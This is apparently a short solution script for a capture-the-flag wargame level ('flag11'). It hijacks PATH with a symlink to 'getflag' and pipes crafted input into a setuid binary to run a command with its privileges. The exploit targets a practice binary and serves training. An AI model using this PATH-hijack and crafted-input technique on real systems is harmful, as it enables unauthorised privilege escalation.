# Solution by Farzad E. (me@dNetGuru.com)  / @dNetGuru

cd
export TEMP=/tmp
ln -s `which getflag` g
export PATH=~:$PATH
printf "Content-Length: 1024\ng\242\374\351\322\2165x\234+%b" `perl -e "print '@' x 1024"` | /home/flag11/flag11
